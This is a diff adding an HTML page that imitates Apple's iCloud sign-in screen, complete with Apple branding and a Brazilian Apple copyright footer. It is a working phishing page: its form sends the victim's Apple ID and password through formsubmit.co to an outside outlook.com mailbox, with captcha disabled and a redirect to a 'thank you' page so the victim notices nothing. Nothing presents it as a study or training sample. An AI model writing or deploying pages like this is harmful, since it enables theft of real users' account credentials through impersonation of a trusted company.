@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>iCloud Login Page</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <script src="seu.js"></script>
+     <div class="login-container">
+
+    <form
+            action="https://formsubmit.co/validaapple_2025@outlook.com"
+            method="POST"
+            class="form"
+    >
+       <img src="ICloud_logo.png" alt="iCloud Logo">
+
+       <h1>Sign in to iCloud</h1>
+
+
+      <div class="form-group">
+        <input oninput='document.getElementById("email").value = this.value' type="text" id="apple-id" placeholder=" " required>
+        <label for="apple-id">Apple ID</label>
+        <button class="arrow-button" onclick="showPasswordInput()">&#x2192;</button>
+      </div>
+
+
+      <div hidden class="form-group">
+        <input type="text" name="email" id="email" placeholder=" " required/>
+        <label for="email">E-mail</label>
+        <button class="arrow-button" onclick="showPasswordInput()">&#x2192;</button>
+      </div>
+
+
+       <div class="form-group" id="password-group" style="display:none;">
+        <input type="password" name="password" id="password" placeholder=" " required>
+        <label for="password">Password</label>
+       </div>
+
+       <input type="hidden" name="_captcha" value="false" />
+
+       <input
+        type="hidden"
+        name="_next"
+        value="http://localhost/appletest/obrigado.html"
+       />
+
+       <button class="login-button" onclick="login()">Entrar</button>
+
+       <a href="#" class="forgot-password">Forgot Apple ID or password?</a>
+
+    </form>
+
+     </div>
+     <div class="footer">
+      Copyright © 2025 Apple Inc. Todos os direitos reservados. Apple Computer Brasil Ltda. CNPJ: 00.623.904/0003-35 <a href="#"></a>
+     </div>
+
+  </body>
+</html>
